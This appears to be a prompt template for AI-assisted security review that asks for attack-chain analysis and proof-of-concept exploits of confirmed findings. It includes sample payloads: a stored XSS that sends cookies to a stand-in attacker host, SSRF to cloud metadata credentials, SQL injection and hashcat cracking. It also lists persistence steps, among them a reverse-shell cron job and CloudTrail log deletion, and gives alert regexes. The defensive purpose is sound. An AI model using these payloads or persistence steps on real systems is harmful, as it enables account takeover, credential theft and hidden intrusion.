# ⛓️ Scan Segment 14 — Attack Chain Analysis

> **Standalone prompt segment.** Use with confirmed findings. Replace the placeholder before running.

---

## Prompt

```
You are an expert security engineer and review below.
The following Critical/High vulnerabilities have been confirmed in our codebase.

[PASTE ALL CONFIRMED CRITICAL AND HIGH FINDINGS]

Now analyze these findings as an attacker would.
```

---

## What to Analyze

**Can any of these be chained together?**
> A Medium-severity information disclosure + a Medium-severity IDOR might chain into a Critical data breach. Look for chains.

**What is the worst-case attack scenario?**
> Starting from zero access, what's the most damaging path through these vulnerabilities? Map it step by step.

**What would a sophisticated attacker do first?**
> Not just "exploit the Critical bug" — consider which vulnerability gives the best foothold, what reconnaissance steps come first, and how an attacker would maintain persistence.

**Develop proof-of-concept exploits for each Critical finding.**
> These MUST work in an isolated test environment.
> ⚠️ Do **NOT** test against production.
> The PoC should demonstrate the actual impact, not just crash the service.

---

## Deliverables Per Exploit

Document exactly what defensive measures would **detect or prevent** it:

| Defense Layer | Would It Stop This? |
|---|---|
| WAF | Would our WAF catch this? |
| Logging | Would our logging capture this? |
| Rate Limiting | Would rate limiting prevent this? |
| Network Segmentation | Would network segmentation contain this? |

---

## 🛠 Technology-Specific Guidance

### Common Attack Chain Patterns

**Chain 1: Information Disclosure → Authentication Bypass**
```
Step 1: Exploit verbose error messages to enumerate valid usernames
        GET /api/login {"user":"admin"} → "Password incorrect" (username exists)
        GET /api/login {"user":"xyz"}   → "User not found" (username doesn't exist)

Step 2: Use enumerated usernames in credential stuffing or password reset abuse

Step 3: Password reset IDOR — request reset for victim, intercept reset token
        POST /api/reset {"email":"victim@example.com"}
        GET /api/reset?token=<sequential_token>  ← token is predictable/enumerable

Result: Account takeover without knowing the password
```

**Chain 2: SSRF → Cloud Metadata → Privilege Escalation**
```
Step 1: SSRF via image URL fetch endpoint
        POST /api/fetch-og {"url":"http://169.254.169.254/latest/meta-data/"}

Step 2: Retrieve IAM role credentials from metadata service
        GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole

Step 3: Use leaked AWS credentials to access S3, RDS, or other services
        aws s3 ls s3://company-backups --profile stolen-creds

Result: Full cloud environment compromise from a single SSRF
```

**Chain 3: XSS → Session Hijack → CSRF**
```
Step 1: Stored XSS in user-generated content (profile bio, comment, etc.)
        Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

Step 2: Admin views the content → attacker captures admin session cookie

Step 3: Use admin session to create backdoor account, exfiltrate data, or
        perform state-changing actions

Result: Full admin access via an end-user's XSS vulnerability
```

**Chain 4: SQL Injection → Data Exfiltration → Credential Reuse**
```
Step 1: SQL injection on a low-privilege endpoint (e.g., product search)
        GET /api/products?search='; SELECT email,password_hash FROM users; --

Step 2: Crack bcrypt hashes offline (GPU-accelerated)
        hashcat -m 3200 hashes.txt rockyou.txt

Step 3: Credential stuffing — try cracked passwords on other services
        (Gmail, GitHub, AWS console, Slack)

Result: Account takeover at scale, supply chain risk
```

### Persistence Techniques (For Red Team Documentation)

```
If attacker achieves code execution:
1. Create backdoor admin account in the database directly
2. Add SSH key to ~/.ssh/authorized_keys
3. Install cron job / systemd timer for reverse shell
4. Modify deployment scripts to maintain access post-redeployment

If attacker achieves cloud access (AWS/GCP/Azure):
1. Create new IAM user with admin privileges
2. Add API keys to their own account
3. Enable CloudTrail log deletion to cover tracks
4. Spin up resources in other regions for lateral movement
```

### Detection Signatures — What Your Logging Should Capture

```python
# Patterns that should trigger alerts:
ALERT_PATTERNS = {
    "sql_injection": [
        r"(?i)(union\s+select|drop\s+table|insert\s+into|';|--\s)",
        r"(?i)(sleep\(\d+\)|benchmark\(\d+)",
    ],
    "path_traversal": [
        r"\.\./|\.\.\\|%2e%2e%2f|%252e%252e%252f",
    ],
    "ssrf_internal": [
        r"169\.254\.169\.254",
        r"(localhost|127\.0\.0\.1|::1)",
        r"(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)",
    ],
    "jwt_none_alg": [
        r"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
    ],
    "xss_attempts": [
        r"<script|javascript:|onerror=|onload=|eval\(",
    ],
}
```

---

## 🎯 Fine-Tune This Segment

```
# Paste here:
# - The confirmed Critical/High findings from earlier scan segments
# - Your cloud provider (affects SSRF → metadata chain viability)
# - Whether admin/elevated roles exist and how they are distinguished
# - Your WAF rules and whether they'd catch common payloads
# - Logging and alerting setup (SIEM, Datadog, CloudWatch Logs alerts)
# - Network segmentation between services (can your web app reach your DB directly?)
# - Any red team or bug bounty rules of engagement to respect
```
